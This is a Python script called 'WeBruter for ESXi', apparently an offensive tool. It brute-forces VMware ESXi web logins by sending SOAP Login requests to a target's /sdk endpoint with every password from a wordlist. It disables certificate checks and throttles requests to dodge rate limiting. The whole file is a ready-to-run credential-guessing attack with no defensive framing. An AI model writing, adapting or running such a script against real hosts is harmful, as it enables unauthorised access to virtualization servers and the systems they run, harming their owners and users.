import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time
from termcolor import colored 

# Banner
print(r"""
 _____ _______   ___   _    _      _          ______            _
|  ___/  ___\ \ / (_) | |  | |    | |         | ___ \          | |
| |__ \ `--. \ V / _  | |  | | ___| |__ ______| |_/ /_ __ _   _| |_ ___ _ __
|  __| `--. \/   \| | | |/\| |/ _ \ '_ \______| ___ \ '__| | | | __/ _ \ '__|
| |___/\__/ / /^\ \ | \  /\  /  __/ |_) |     | |_/ / |  | |_| | ||  __/ |
\____/\____/\/   \/_|  \/  \/ \___|_.__/      \____/|_|   \__,_|\__\___|_|
      """)
print("*" * 30)
print("           .-.")
print("          (0.0)")
print("        '=.|m|.='")
print("        .='`\"``=.")
print("     WeBruter for ESXi")
print("*" * 30)

# Suppress InsecureRequestWarning if needed
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Function to perform brute force attack using SOAP request format
def brute_force_esxi_login(target_ip, username, wordlist_filepath):
    # Set up the target URL for the login endpoint
    url = f"https://{target_ip}/sdk"  # ESXi SDK login URL
   
    # Create a session to manage cookies and headers
    session = requests.Session()

    # Set up headers for the request
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'application/soap+xml, application/dime, multipart/related, text/*, application/x-www-form-urlencoded, application/xml',
    }

    # Step 1: Read the wordlist file
    try:
        with open(wordlist_filepath, 'rb') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(colored("Error: Wordlist file not found.", 'red'))
        return

    # Decode passwords from bytes to string, ignoring errors
    passwords = [password.decode('utf-8', errors='ignore').strip() for password in passwords]

    # Step 2: Brute-force the login attempt with each password
    for password in passwords:
        print(colored(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Attacking {target_ip}", 'cyan'))
       
        # Create the SOAP request body (with dynamic password)
        soap_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <Header>
        <operationID>esxui-202</operationID>
    </Header>
    <Body>
        <Login xmlns="urn:vim25">
            <_this type="SessionManager">ha-sessionmgr</_this>
            <userName>{username}</userName>
            <password>{password}</password>
            <locale>en-US</locale>
        </Login>
    </Body>
</Envelope>"""

        # Step 3: Send the SOAP request
        try:
            response = session.post(url, data=soap_body, headers=headers, verify=False)
           
            # Log the response for debugging purposes
            # print(f"Response Code: {response.status_code}")
            # print(f"Response Text (first 500 chars): {response.text[:500]}")  # Print the first 500 characters of the response
           
            # Check for login failure (based on the 500 response format you provided)
            if "<faultstring>Cannot complete login due to an incorrect user name or password.</faultstring>" in response.text:
                continue
            else:
                print(colored(f"Success! Found valid password: {password}", 'green'))
                break  # Exit on success
        except requests.exceptions.RequestException as e:
            print(colored(f"Error during request: {e}", 'yellow'))

        # Wait for a short period to avoid rate limiting/blocking (adjust if needed)
        time.sleep(1)

# Main function to prompt user input and run the brute-force
def main():
    print(colored("ESXi Web UI Brute-Force Login Script", 'blue', attrs=['bold']))
   
    # Get user inputs
    target_ip = input(colored("Enter the target IP address: ", 'yellow'))
    username = input(colored("Enter the username: ", 'yellow'))
    wordlist_filepath = input(colored("Enter the full file path of the wordlist: ", 'yellow'))
   
    # Call brute force function
    brute_force_esxi_login(target_ip, username, wordlist_filepath)

if __name__ == "__main__":
    main()
